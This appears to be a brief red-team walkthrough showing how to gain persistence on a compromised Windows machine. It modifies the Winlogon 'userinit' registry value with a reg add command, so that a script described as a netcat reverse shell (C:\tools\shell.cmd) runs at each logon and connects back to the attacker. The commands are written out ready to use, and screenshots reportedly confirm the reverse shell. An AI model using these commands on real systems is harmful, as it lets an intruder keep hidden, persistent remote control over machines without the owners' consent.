Let's run through the techqnique abusing the userinit subkey.
Let's see what's currently held at the userinit:

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit
```

![image](https://user-images.githubusercontent.com/86452055/166085572-2d47e22c-b49d-4fc7-a1d3-d3c0e2cc33c8.png)

Let's now add an additional item shell.cmd (a simple reverse netcat shell) to the list that we want to be launched when the compromised machine reboots:

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\tools\shell.cmd /t reg_sz /f
```

![image](https://user-images.githubusercontent.com/86452055/166085587-d4459f49-bc2a-460f-9902-d31eb2fb35e0.png)

Rebooting the compromised system executes the c:\tools\shell.cmd, which in turn establishes a reverse shell to the attacking system:

![image](https://user-images.githubusercontent.com/86452055/166085594-90819aec-b7d0-4c95-99e3-aaa64615fbd6.png)
